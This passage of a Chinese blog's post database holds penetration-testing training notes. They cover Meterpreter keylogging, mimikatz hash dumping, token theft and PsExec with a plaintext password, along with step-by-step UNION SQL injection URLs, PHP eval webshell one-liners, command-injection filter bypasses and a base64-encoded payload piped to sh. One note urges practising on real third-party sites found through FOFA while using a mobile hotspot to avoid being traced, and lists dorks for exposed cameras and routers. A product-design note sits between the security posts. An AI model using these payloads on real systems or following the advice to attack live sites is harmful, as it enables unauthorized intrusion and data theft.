class=\"line\">\t\t\t\t\tportfwd add -l 4444 -p 3389 -r 10.211.55.7 // 把目标机10.211.55.7的3389端口转发到本机127.0.0.1的4444端口，直接进行连接本机4444端口即可3389远程连接，同样如果本地两台电脑，另一台电脑直接远程访问开启4444主机的IP+4444可以直接进行连接，，，，注意端口转发并不需要高权限上线就可以直接转发。</span><br><span class=\"line\">21、键盘记录:</span><br><span class=\"line\">\t\t\t\tkeyscan_start: 开启键盘记录功能</span><br><span class=\"line\">\t\t\t\tkeyscan_dump: 显示捕捉的键盘记录信息</span><br><span class=\"line\">\t\t\t\tkeyscan_stop: 停止键盘记录</span><br><span class=\"line\">21、获取<span class=\"built_in\">hash</span>值: load mimikatz（32位）load kivi（64位）此时调用完成就直接可以使用该模块的命令，但是使用该命令需要拥有系统system权限，同样也可以使用hashdump导出</span><br><span class=\"line\">22、盗取身份令牌: use incognito</span><br><span class=\"line\">\t\t\t\t\tlist_tokens -u: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换</span><br><span class=\"line\">\t\t\t\t\tlist_tokens -g: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换</span><br><span class=\"line\">\t\t\t\t\timpersonate_token LUCKYXBDC6\\luckyx: 切换令牌身份</span><br></pre></td></tr></table></figure>\n\n<p>使用微软PsExec工具连接服务器cmd，控制域控。</p>\n<p><a href=\"https://blog.csdn.net/qq_44874645/article/details/121394678\">【渗透测试笔记】之【内网渗透——横向移动：PsExec的使用】</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PsExec64.exe /accepteula /s \\\\192.168.52.138 -u Administrator -p 12345@QwerT cmd</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"内网穿透\"><a href=\"#内网穿透\" class=\"headerlink\" title=\"内网穿透\"></a>内网穿透</h1><p>工具：</p>\n<ul>\n<li>ew</li>\n<li>frp</li>\n<li>nps</li>\n<li>metasploit</li>\n<li>CobalStrike</li>\n</ul>\n<h1 id=\"尝试\"><a href=\"#尝试\" class=\"headerlink\" title=\"尝试\"></a>尝试</h1><p>fscan 扫描端口与服务。</p>\n<p>比如扫出 cve 漏洞，搜索如何利用漏洞攻击；redis未授权漏洞中 <code>/root/.ssh/</code> 可写的话可直接上传公钥连接ssh。</p>\n<ul>\n<li>通过redis备份方式写入</li>\n</ul>\n<p><a href=\"https://www.cnblogs.com/-qing-/p/10978912.html\">Redis未授权访问写Webshell和公私钥认证获取root权限</a></p>\n<ul>\n<li>通过fscan写入redis文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan -h 172.24.31.169 -rf /home/kali/.ssh/id_rsa.pub</span><br><span class=\"line\"></span><br><span class=\"line\">ssh -i id_rsa root@172.24.31.169</span><br></pre></td></tr></table></figure>\n\n<p>注：使用python开启web下载服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python2 开启web下载服务器（后台有日志）</span></span><br><span class=\"line\"><span class=\"built_in\">nohup</span> python -u -m SimpleHTTPServer &gt; download.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># python3 开启web下载服务器</span></span><br><span class=\"line\">python -m http.server 8000</span><br></pre></td></tr></table></figure>\n\n<p>msf攻击windows靶机，假设靶机拥有<code>MS17-010</code>漏洞：</p>\n<p>win7使用<code>exploit/windows/smb/ms17_010_eternalblue</code>比较稳定，win2012及以上使用<code>exploit/windows/smb/ms17_010_psexec</code>较稳定。</p>\n<p><a href=\"https://blog.csdn.net/qq_43645782/article/details/106870256\">msf下MS17-010模块使用总结</a></p>"},{"layout":"pages","title":"产品经理与互联网思维培训记录","date":"2022-10-28T02:22:55.000Z","_content":"\n<!-- more -->\n\n**用户体验评审标准 - 可用性**\n\nISO 9241-11 国际标准可用性定义：产品在特定环境下为特定用户用于特定用途时所具有的\n\n- 有效性\n- 效率\n- 用户主观满意度\n\n主要考虑有效性和效率，主观满意度没有明确标准。\n\n# 基于产品设计流程进行用户体验设计\n\n## 产品设计的标准流程\n\nUCD（User Centered Design）是指以用户为中心的设计，在设计过程中以用户体验为设计决策的中心，强调用户优先。\n\n有效需求：能说清楚为什么需要这样做。\n","source":"_posts/2022/12/产品经理与互联网思维培训记录.md","raw":"---\nlayout: pages\ntitle: 产品经理与互联网思维培训记录\ndate: 2022-10-28 10:22:55\ntags:\n---\n\n<!-- more -->\n\n**用户体验评审标准 - 可用性**\n\nISO 9241-11 国际标准可用性定义：产品在特定环境下为特定用户用于特定用途时所具有的\n\n- 有效性\n- 效率\n- 用户主观满意度\n\n主要考虑有效性和效率，主观满意度没有明确标准。\n\n# 基于产品设计流程进行用户体验设计\n\n## 产品设计的标准流程\n\nUCD（User Centered Design）是指以用户为中心的设计，在设计过程中以用户体验为设计决策的中心，强调用户优先。\n\n有效需求：能说清楚为什么需要这样做。\n","slug":"2022/12/产品经理与互联网思维培训记录","published":1,"updated":"2022-11-19T14:48:57.241Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj9003uzge3a6wfflfk","content":"<span id=\"more\"></span>\n\n<p><strong>用户体验评审标准 - 可用性</strong></p>\n<p>ISO 9241-11 国际标准可用性定义：产品在特定环境下为特定用户用于特定用途时所具有的</p>\n<ul>\n<li>有效性</li>\n<li>效率</li>\n<li>用户主观满意度</li>\n</ul>\n<p>主要考虑有效性和效率，主观满意度没有明确标准。</p>\n<h1 id=\"基于产品设计流程进行用户体验设计\"><a href=\"#基于产品设计流程进行用户体验设计\" class=\"headerlink\" title=\"基于产品设计流程进行用户体验设计\"></a>基于产品设计流程进行用户体验设计</h1><h2 id=\"产品设计的标准流程\"><a href=\"#产品设计的标准流程\" class=\"headerlink\" title=\"产品设计的标准流程\"></a>产品设计的标准流程</h2><p>UCD（User Centered Design）是指以用户为中心的设计，在设计过程中以用户体验为设计决策的中心，强调用户优先。</p>\n<p>有效需求：能说清楚为什么需要这样做。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>用户体验评审标准 - 可用性</strong></p>\n<p>ISO 9241-11 国际标准可用性定义：产品在特定环境下为特定用户用于特定用途时所具有的</p>\n<ul>\n<li>有效性</li>\n<li>效率</li>\n<li>用户主观满意度</li>\n</ul>\n<p>主要考虑有效性和效率，主观满意度没有明确标准。</p>\n<h1 id=\"基于产品设计流程进行用户体验设计\"><a href=\"#基于产品设计流程进行用户体验设计\" class=\"headerlink\" title=\"基于产品设计流程进行用户体验设计\"></a>基于产品设计流程进行用户体验设计</h1><h2 id=\"产品设计的标准流程\"><a href=\"#产品设计的标准流程\" class=\"headerlink\" title=\"产品设计的标准流程\"></a>产品设计的标准流程</h2><p>UCD（User Centered Design）是指以用户为中心的设计，在设计过程中以用户体验为设计决策的中心，强调用户优先。</p>\n<p>有效需求：能说清楚为什么需要这样做。</p>"},{"title":"2024网络安全培训","date":"2024-06-14T01:00:00.000Z","_content":"\n2024 网络安全培训部分笔记\n\n<!-- more -->\n\n# Burp Suite\n\n安装后可以设置 proxy 端口，推荐使用 firefox 并安装代理切换插件如 ZeroOmega，配置代理为 Burp 的 proxy 端口；\n然后在 Proxy--Intercept 界面设置 Intercept is on 即可拦截请求包，可修改/Send to Repeater(重复发包)/Send to Intruder(设置变量，配置字典进行爆破)；\n\n# 脱库\n1. 检查 sql 注入漏洞，构造闭合查询\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' and 1=2-- -\n2. 通过 order by 排序，得知查询结果列数\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' order by 4-- -\n3. 再根据目标的排序列数 进行联合查询\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' union select 1, 2, 3-- -\n4. 一个萝卜一个坑的概念 让前面的查询为空 我们后面构造的恶意语句就可以有地方回显了\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, 2, 3-- -\n5. 拖数据库的名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (database()), 3-- -\n6. 拖表名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3-- -\n7. 拖你感兴趣的表的列名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(column_name) from information_schema.columns where table_name=\"emails\"), 3-- -\n8. 拖字段\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(id, 0x3a, email_id) from emails), 3-- -\n\n# 上传木马文件\n\n1. 前端校验，不可靠\n2. content-type校验：你上传的文件类型是不是 image/jpeg | image/png | image/gif\n3. 校验你上传的文件后缀名是不是非法文件\n  > 例如 php | jsp | aspx，绕过手段：直接用畸形后缀名，例如phtml 或者 php1-9\n4. 内容校验\n  > 校验文件头:GIF89a\n5. 校验上传的内容有没有木马特征\n  > 例如校验内容里面有没有 `<?`，绕过方式：`<script language=\"php\">@eval($_POST['cmd']);</script>`\n  >\n  > 例如校验内容里面有没有php，绕过方式：`<?=@eval($_POST['xbw'])`;\n\n# 命令执行\n\n1. 管道符(能够支持你同时执行多条命令)\n  > ;\n  >\n  > |\n  >\n  > &\n  >\n  > ||\n  >\n  > &&\n2. 过滤空格（检测你的输入里面有没有空格 有空格我就拦截）\n  > $IFS$9\n  >\n  > ${IFS}\n  >\n  > %09 url 编码\n3. 如果目标过滤了特殊字符，例如 flag，可以用通配符代替\n  > ?：代替单个字母\n  > \n  > *：代替多个字母\n4. 内联执行\n  > **cat \\`ls\\`** ，ls 的结果会被 cat 执行\n5. 拼接\n  > a=fl;b=ag.php;cat $a$b\n6. base64编码\n  > target=127.0.0.1|echo Y2F0IC9mbGFn|base64 -d|sh\n  >\n  > Y2F0IC9mbGFn 这个是cat /flag的编码后结果","source":"_posts/2024/06/网络安全培训.md","raw":"---\ntitle: 2024网络安全培训\ndate: 2024-06-14 09:00:00\ntags:\n  - 培训\n  - 网络安全\ncategories:\n  - 培训\n  - 网络安全\n---\n\n2024 网络安全培训部分笔记\n\n<!-- more -->\n\n# Burp Suite\n\n安装后可以设置 proxy 端口，推荐使用 firefox 并安装代理切换插件如 ZeroOmega，配置代理为 Burp 的 proxy 端口；\n然后在 Proxy--Intercept 界面设置 Intercept is on 即可拦截请求包，可修改/Send to Repeater(重复发包)/Send to Intruder(设置变量，配置字典进行爆破)；\n\n# 脱库\n1. 检查 sql 注入漏洞，构造闭合查询\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' and 1=2-- -\n2. 通过 order by 排序，得知查询结果列数\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' order by 4-- -\n3. 再根据目标的排序列数 进行联合查询\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1>' union select 1, 2, 3-- -\n4. 一个萝卜一个坑的概念 让前面的查询为空 我们后面构造的恶意语句就可以有地方回显了\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, 2, 3-- -\n5. 拖数据库的名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (database()), 3-- -\n6. 拖表名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3-- -\n7. 拖你感兴趣的表的列名字\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(column_name) from information_schema.columns where table_name=\"emails\"), 3-- -\n8. 拖字段\n  > <http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1>' union select 1, (select group_concat(id, 0x3a, email_id) from emails), 3-- -\n\n# 上传木马文件\n\n1. 前端校验，不可靠\n2. content-type校验：你上传的文件类型是不是 image/jpeg | image/png | image/gif\n3. 校验你上传的文件后缀名是不是非法文件\n  > 例如 php | jsp | aspx，绕过手段：直接用畸形后缀名，例如phtml 或者 php1-9\n4. 内容校验\n  > 校验文件头:GIF89a\n5. 校验上传的内容有没有木马特征\n  > 例如校验内容里面有没有 `<?`，绕过方式：`<script language=\"php\">@eval($_POST['cmd']);</script>`\n  >\n  > 例如校验内容里面有没有php，绕过方式：`<?=@eval($_POST['xbw'])`;\n\n# 命令执行\n\n1. 管道符(能够支持你同时执行多条命令)\n  > ;\n  >\n  > |\n  >\n  > &\n  >\n  > ||\n  >\n  > &&\n2. 过滤空格（检测你的输入里面有没有空格 有空格我就拦截）\n  > $IFS$9\n  >\n  > ${IFS}\n  >\n  > %09 url 编码\n3. 如果目标过滤了特殊字符，例如 flag，可以用通配符代替\n  > ?：代替单个字母\n  > \n  > *：代替多个字母\n4. 内联执行\n  > **cat \\`ls\\`** ，ls 的结果会被 cat 执行\n5. 拼接\n  > a=fl;b=ag.php;cat $a$b\n6. base64编码\n  > target=127.0.0.1|echo Y2F0IC9mbGFn|base64 -d|sh\n  >\n  > Y2F0IC9mbGFn 这个是cat /flag的编码后结果","slug":"2024/06/网络安全培训","published":1,"updated":"2024-07-11T10:07:21.848Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj9003zzge3b51z6k9v","content":"<p>2024 网络安全培训部分笔记</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Burp-Suite\"><a href=\"#Burp-Suite\" class=\"headerlink\" title=\"Burp Suite\"></a>Burp Suite</h1><p>安装后可以设置 proxy 端口，推荐使用 firefox 并安装代理切换插件如 ZeroOmega，配置代理为 Burp 的 proxy 端口；<br>然后在 Proxy–Intercept 界面设置 Intercept is on 即可拦截请求包，可修改&#x2F;Send to Repeater(重复发包)&#x2F;Send to Intruder(设置变量，配置字典进行爆破)；</p>\n<h1 id=\"脱库\"><a href=\"#脱库\" class=\"headerlink\" title=\"脱库\"></a>脱库</h1><ol>\n<li>检查 sql 注入漏洞，构造闭合查询<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ and 1&#x3D;2– -</p>\n</blockquote>\n</li>\n<li>通过 order by 排序，得知查询结果列数<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ order by 4– -</p>\n</blockquote>\n</li>\n<li>再根据目标的排序列数 进行联合查询<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ union select 1, 2, 3– -</p>\n</blockquote>\n</li>\n<li>一个萝卜一个坑的概念 让前面的查询为空 我们后面构造的恶意语句就可以有地方回显了<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, 2, 3– -</p>\n</blockquote>\n</li>\n<li>拖数据库的名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (database()), 3– -</p>\n</blockquote>\n</li>\n<li>拖表名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()), 3– -</p>\n</blockquote>\n</li>\n<li>拖你感兴趣的表的列名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;”emails”), 3– -</p>\n</blockquote>\n</li>\n<li>拖字段<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(id, 0x3a, email_id) from emails), 3– -</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"上传木马文件\"><a href=\"#上传木马文件\" class=\"headerlink\" title=\"上传木马文件\"></a>上传木马文件</h1><ol>\n<li>前端校验，不可靠</li>\n<li>content-type校验：你上传的文件类型是不是 image&#x2F;jpeg | image&#x2F;png | image&#x2F;gif</li>\n<li>校验你上传的文件后缀名是不是非法文件<blockquote>\n<p>例如 php | jsp | aspx，绕过手段：直接用畸形后缀名，例如phtml 或者 php1-9</p>\n</blockquote>\n</li>\n<li>内容校验<blockquote>\n<p>校验文件头:GIF89a</p>\n</blockquote>\n</li>\n<li>校验上传的内容有没有木马特征<blockquote>\n<p>例如校验内容里面有没有 <code>&lt;?</code>，绕过方式：<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>\n<p>例如校验内容里面有没有php，绕过方式：<code>&lt;?=@eval($_POST[&#39;xbw&#39;])</code>;</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><ol>\n<li>管道符(能够支持你同时执行多条命令)<blockquote>\n<p>;</p>\n<p>|</p>\n<p>&amp;</p>\n<p>||</p>\n<p>&amp;&amp;</p>\n</blockquote>\n</li>\n<li>过滤空格（检测你的输入里面有没有空格 有空格我就拦截）<blockquote>\n<p>$IFS$9</p>\n<p>${IFS}</p>\n<p>%09 url 编码</p>\n</blockquote>\n</li>\n<li>如果目标过滤了特殊字符，例如 flag，可以用通配符代替<blockquote>\n<p>?：代替单个字母</p>\n<p>*：代替多个字母</p>\n</blockquote>\n</li>\n<li>内联执行<blockquote>\n<p><strong>cat `ls`</strong> ，ls 的结果会被 cat 执行</p>\n</blockquote>\n</li>\n<li>拼接<blockquote>\n<p>a&#x3D;fl;b&#x3D;ag.php;cat $a$b</p>\n</blockquote>\n</li>\n<li>base64编码<blockquote>\n<p>target&#x3D;127.0.0.1|echo Y2F0IC9mbGFn|base64 -d|sh</p>\n<p>Y2F0IC9mbGFn 这个是cat &#x2F;flag的编码后结果</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>2024 网络安全培训部分笔记</p>","more":"<h1 id=\"Burp-Suite\"><a href=\"#Burp-Suite\" class=\"headerlink\" title=\"Burp Suite\"></a>Burp Suite</h1><p>安装后可以设置 proxy 端口，推荐使用 firefox 并安装代理切换插件如 ZeroOmega，配置代理为 Burp 的 proxy 端口；<br>然后在 Proxy–Intercept 界面设置 Intercept is on 即可拦截请求包，可修改&#x2F;Send to Repeater(重复发包)&#x2F;Send to Intruder(设置变量，配置字典进行爆破)；</p>\n<h1 id=\"脱库\"><a href=\"#脱库\" class=\"headerlink\" title=\"脱库\"></a>脱库</h1><ol>\n<li>检查 sql 注入漏洞，构造闭合查询<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ and 1&#x3D;2– -</p>\n</blockquote>\n</li>\n<li>通过 order by 排序，得知查询结果列数<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ order by 4– -</p>\n</blockquote>\n</li>\n<li>再根据目标的排序列数 进行联合查询<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=1</a>‘ union select 1, 2, 3– -</p>\n</blockquote>\n</li>\n<li>一个萝卜一个坑的概念 让前面的查询为空 我们后面构造的恶意语句就可以有地方回显了<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, 2, 3– -</p>\n</blockquote>\n</li>\n<li>拖数据库的名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (database()), 3– -</p>\n</blockquote>\n</li>\n<li>拖表名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()), 3– -</p>\n</blockquote>\n</li>\n<li>拖你感兴趣的表的列名字<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;”emails”), 3– -</p>\n</blockquote>\n</li>\n<li>拖字段<blockquote>\n<p><a href=\"http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1\">http://120.46.58.198:28066/Tkitn/sqli-labs-master/Less-1/index.php?id=-1</a>‘ union select 1, (select group_concat(id, 0x3a, email_id) from emails), 3– -</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"上传木马文件\"><a href=\"#上传木马文件\" class=\"headerlink\" title=\"上传木马文件\"></a>上传木马文件</h1><ol>\n<li>前端校验，不可靠</li>\n<li>content-type校验：你上传的文件类型是不是 image&#x2F;jpeg | image&#x2F;png | image&#x2F;gif</li>\n<li>校验你上传的文件后缀名是不是非法文件<blockquote>\n<p>例如 php | jsp | aspx，绕过手段：直接用畸形后缀名，例如phtml 或者 php1-9</p>\n</blockquote>\n</li>\n<li>内容校验<blockquote>\n<p>校验文件头:GIF89a</p>\n</blockquote>\n</li>\n<li>校验上传的内容有没有木马特征<blockquote>\n<p>例如校验内容里面有没有 <code>&lt;?</code>，绕过方式：<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>\n<p>例如校验内容里面有没有php，绕过方式：<code>&lt;?=@eval($_POST[&#39;xbw&#39;])</code>;</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><ol>\n<li>管道符(能够支持你同时执行多条命令)<blockquote>\n<p>;</p>\n<p>|</p>\n<p>&amp;</p>\n<p>||</p>\n<p>&amp;&amp;</p>\n</blockquote>\n</li>\n<li>过滤空格（检测你的输入里面有没有空格 有空格我就拦截）<blockquote>\n<p>$IFS$9</p>\n<p>${IFS}</p>\n<p>%09 url 编码</p>\n</blockquote>\n</li>\n<li>如果目标过滤了特殊字符，例如 flag，可以用通配符代替<blockquote>\n<p>?：代替单个字母</p>\n<p>*：代替多个字母</p>\n</blockquote>\n</li>\n<li>内联执行<blockquote>\n<p><strong>cat `ls`</strong> ，ls 的结果会被 cat 执行</p>\n</blockquote>\n</li>\n<li>拼接<blockquote>\n<p>a&#x3D;fl;b&#x3D;ag.php;cat $a$b</p>\n</blockquote>\n</li>\n<li>base64编码<blockquote>\n<p>target&#x3D;127.0.0.1|echo Y2F0IC9mbGFn|base64 -d|sh</p>\n<p>Y2F0IC9mbGFn 这个是cat &#x2F;flag的编码后结果</p>\n</blockquote>\n</li>\n</ol>"},{"title":"2024网络安全资产测绘培训","date":"2024-06-27T01:00:00.000Z","_content":"\n2024网络安全资产测绘培训部分笔记\n\n<!-- more -->\n\n# 互联网资产测绘\n\n## 互联网权属资产发现\n\n网络空间搜索引擎\n\n- [FOFA](https://fofa.info/)\n- [HUNTER](https://hunter.qianxin.com/)\n- [NoMoney](https://github.com/H-Limbus/NoMoney)\n- [EASM](#互联网权属资产发现)，行内引擎，未来会有更齐全的资产测绘平台\n\n企业综合信息收集工具\n\n- [ENSCAN_GO](https://github.com/wgpsec/ENScan_GO)\n  > 收集信息类型：控股公司、ICP备案、APP、公众号、小程序、供应商......\n  >\n  > 主要功能：企业控股关系、根域名收集\n- [OneForAll](https://github.com/shmilylty/OneForAll)\n  > 收集信息类型：子域名、网站信息\n  >\n  > 主要功能：根据根域名通过爆破、爬虫、搜索引擎等渠道全面收集子域名和网站信息\n- [ShuiZe](https://github.com/0x727/ShuiZe_0x727)\n  > 收集信息类型：顶级域名、子域名、网站信息、邮箱、漏洞\n  >\n  > 主要功能：一条龙全方位资产收集\n- [EZ](https://github.com/m-sec-org/EZ/)\n  > 社区版，需要[注册申请证书](https://msec.nsfocus.com/auth/register)\n  >\n  > 收集信息类型：子域名、IP端口、网站信息、漏洞\n  >\n  > 主要功能：一条龙全方位资产收集\n\n社工信息收集\n\n- 搜索引擎搜索\n  > 常用查询语法：inurl:\"xxx\" intitle:\"xxx\" filetype:\"xxx\" ......\n  >\n  > [渗透中超全的 Google Hack 语法分享](https://clarkqwq.top/archives/shen-tou-zhong-chao-quan-de-googlehack-yu-fa-fen-xiang)\n- 网盘搜索\n  > 搜索方式：众多网盘搜索引擎，例如：[凌风云](https://www.lingfengyun.com/)\n- 文库搜索\n  > 百度文库、豆丁文库、360文库等等\n- 其他可能存在企业敏感资料的平台\n  > Github、Gitee、CSDN等等，泄露的数据库密码、邮箱、甚至源码。\n\n邮箱收集工具\n\n- [EmailAll](https://github.com/Taonn/EmailAll)\n- [Email Extractor Pro](https://www.emailgrabber.net/go/download)\n- [theHarvester](https://github.com/laramies/theHarvester)，kali自带\n\n个人敏感信息收集\n\n## 风险资产发现\n\n出现新的漏洞，想要练手怎么办？\n要知道很多漏洞存在的组件都是需要付费购买或者企业注册等途径才能获取，人工搭建环境复现非常耗费精力，\n我们可以通过前面讲过的网络空间搜索引擎查找风险资产进行练手，\n当然大家尝试的时候一定要注意反溯源，尽量不要用单位/家里的WiFi做测试，建议用热点测试，\n也尽量挑一些小站点测试\n\n- 风险组件识别\n  - Spring Boot框架识别，fofa通过网页内容识别 body=\"Whitelabel Error Page\"\n  - shiro框架识别，app=\"Apache-Shiro\" || header=\"rememberme=deleteMe\" || header=\"shiroCookie\"\n  - Struts2框架，app=\"Struts2\"\n  - Weblogic识别，app=\"BEA-WebLogic-Server\" ||  app=\"Weblogic_interface_7001\"\n  - WEB应用搜索，若依 icon_hash=\"706913071\" || title=\"若依\"，nginxWebUI app=\"nginxWebUI\"\n- 敏感的页面、接口识别\n  - 后台管理页面识别，Google site:http://xx.com intext:管理，fofa banner=\"admin\"\n  - 上传接口识别，Google site:http://xx.com inurl:load，fofa body=\"method=\\\"post\\\"\n  - 各类文件下载，配置文件 Google site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini\n- 风险设备识别\n  - 摄像头、监控视频，Google inurl:\"ViewerFrame?Mode=\"，fofa title=\"Live View / –\"\n  - 路由器等网络设备，Google inurl:login.cgi intitle:NETGEAR NETGEAR （在线查找GSS108E ProSAFE PoE +点击开关,默认密码password），fofa title=\"锐捷网络-EWEB网管系统\" icon_hash=\"-692947551\"\n\n# 其他工具\n\n- [shuanx/BurpFingerPrint](https://github.com/shuanx/BurpFingerPrint)\n- [gh0stkey/HaE](https://github.com/gh0stkey/HaE)\n\n# Logstash\n\n- [Logstash：Logstash 入门教程 （一）](https://blog.csdn.net/UbuntuTouch/article/details/105973985)\n- [Logstash：Logstash 入门教程 （二）](https://elasticstack.blog.csdn.net/article/details/105979677)\n- [Logstash：使用 mutate 过滤器](https://elasticstack.blog.csdn.net/article/details/106466873)\n- [logstash过滤器插件filter详解及实例](https://www.cnblogs.com/FengGeBlog/p/10305318.html)\n","source":"_posts/2024/06/资产测绘笔记.md","raw":"---\ntitle: 2024网络安全资产测绘培训\ndate: 2024-06-27 09:00:00\ntags:\n  - 培训\n  - 网络安全\ncategories:\n  - 培训\n  - 网络安全\n---\n\n2024网络安全资产测绘培训部分笔记\n\n<!-- more -->\n\n# 互联网资产测绘\n\n## 互联网权属资产发现\n\n网络空间搜索引擎\n\n- [FOFA](https://fofa.info/)\n- [HUNTER](https://hunter.qianxin.com/)\n- [NoMoney](https://github.com/H-Limbus/NoMoney)\n- [EASM](#互联网权属资产发现)，行内引擎，未来会有更齐全的资产测绘平台\n\n企业综合信息收集工具\n\n- [ENSCAN_GO](https://github.com/wgpsec/ENScan_GO)\n  > 收集信息类型：控股公司、ICP备案、APP、公众号、小程序、供应商......\n  >\n  > 